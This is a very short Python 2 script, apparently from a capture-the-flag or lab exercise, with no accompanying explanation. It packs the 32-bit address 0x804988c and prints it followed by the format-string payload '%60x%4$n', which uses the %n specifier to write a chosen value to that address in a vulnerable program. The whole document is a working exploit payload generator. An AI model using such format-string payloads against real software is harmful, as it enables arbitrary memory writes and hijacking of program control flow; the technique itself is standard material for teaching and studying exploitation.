import struct

system_addr = struct.pack('I', 0x804988c)

print system_addr + "%60x%4$n"
